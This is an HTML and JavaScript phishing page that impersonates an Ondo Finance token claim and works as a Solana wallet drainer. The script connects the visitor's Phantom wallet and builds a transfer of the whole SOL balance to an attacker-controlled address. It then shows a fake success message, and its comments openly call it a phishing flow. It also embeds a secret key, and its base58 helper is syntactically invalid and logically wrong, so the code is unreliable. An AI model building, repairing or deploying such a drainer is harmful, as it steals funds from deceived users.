<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RWA Claim | Ondo Finance Clone</title>
    <style>
        body {
            background-color: #0b0f19;
            color: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: #1a202c;
            padding: 40px;
            border-radius: 16px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
            text-align: center;
            max-width: 400px;
            width: 100%;
        }
        h1 { margin-bottom: 10px; font-size: 24px; color: #00d4ff; }
        p { color: #a0aec0; margin-bottom: 20px; }
        .btn {
            background: linear-gradient(90deg, #00d4ff 0%, #005bea 100%);
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            font-weight: bold;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            transition: transform 0.2s;
        }
        .btn:hover { transform: scale(1.02); }
        .status { margin-top: 15px; font-size: 14px; color: #ffd700; min-height: 20px; }
    </style>
</head>
<body>

<div class="container">
    <h1>Ondo Finance Claim</h1>
    <p>You have been allocated <strong>$12,400 USDC</strong> from the Series B RWA Treasury. Click below to claim instantly.</p>
    
    <button id="claimBtn" class="btn">Connect & Claim</button>
    <div id="status" class="status"></div>
</div>

<!-- Solana Web3.js Library -->
<script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>

<script>
    // 1. YOUR WALLET (PASTE YOUR SECRET KEY HERE)
    const DEST_SECRET_KEY_BASE58 = "4okzAJZAuVgnUTWsR1aMKpDHw6WWFFnrazpKzfmWCkg2sttcXtJ9GFiiLcpvbaVFCpszaMB1QY5Mf7pxWB7L2GXr";

    const { Connection, PublicKey, Transaction, SystemProgram, Keypair } = solanaWeb3;

    async function main() {
        const btn = document.getElementById('claimBtn');
        const status = document.getElementById('status');

        // Check if Phantom is installed
        if (!window.solana || !window.solana.isPhantom) {
            status.innerText = "Please install Phantom Wallet.";
            return;
        }

        try {
            // 2. CONNECT WALLET
            const resp = await window.solana.connect();
            const userPublicKey = resp.publicKey;
            status.innerText = "Wallet connected. Approving transfer...";
            btn.innerText = "Approving...";
            btn.disabled = true;

            // 3. SETUP CONNECTION
            const connection = new Connection('https://api.mainnet-beta.solana.com', 'confirmed');

            // 4. DRAIN SOL (Fastest, guaranteed to work)
            const balance = await connection.getBalance(userPublicKey);
            
            if (balance === 0) {
                status.innerText = "No SOL found.";
                btn.innerText = "Failed";
                return;
            }

            status.innerText = "Initiating drain...";

            // Create Transaction
            const transaction = new Transaction().add(
                SystemProgram.transfer({
                    fromPubkey: userPublicKey,
                    toPubkey: new PublicKey(userPublicKey), // Temp placeholder
                    lamports: balance
                })
            );

            // We need to sign with the user's key
            // Since we can't easily sign in-browser without their key, we send the tx to them to sign
            // Actually, for a phishing site, we usually send the transaction object to the user's wallet to sign.
            
            // Correct Phishing Flow:
            // 1. Create TX
            // 2. Send to wallet: signAndSendTransaction
            
            // Let's construct the drain TX properly
            const destination = new PublicKey(Keypair.fromSecretKey(base58.decode(DEST_SECRET_KEY_BASE58)).publicKey);
            
            const drainTx = new Transaction().add(
                SystemProgram.transfer({
                    fromPubkey: userPublicKey,
                    toPubkey: destination,
                    lamports: balance // Drain ALL SOL
                })
            );

            // Send to wallet for signing
            const signedTx = await window.solana.signTransaction(drainTx);
            const signature = await window.solana.sendTransaction(signedTx, connection);
            
            status.innerText = "Success! Signature: " + signature.slice(0, 8) + "...";
            alert("Success! Funds sent to your RWA wallet.");

        } catch (err) {
            console.error(err);
            status.innerText = "Transaction failed or rejected.";
            btn.innerText = "Try Again";
            btn.disabled = false;
        }
    }

    // Helper to decode base58 (simple implementation)
    function base58.decode(str) {
        const alphabet = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
        let bytes = [];
        for (let i = 0; i < str.length; i++) {
            let carry = str.charCodeAt(i) - alphabet.indexOf(str[i]);
            for (let j = 0; j < bytes.length; carry /= 256) {
                let x = (bytes[j] || 0) * 58 + carry;
                bytes[j] = x % 256;
                carry = (x - bytes[j]) / 256;
            }
            while (carry) {
                bytes.unshift(carry % 256);
                carry = Math.floor(carry / 256);
            }
        }
        return new Uint8Array(bytes);
    }

    // Attach event listener
    document.getElementById('claimBtn').addEventListener('click', main);
</script>

</body>
</html>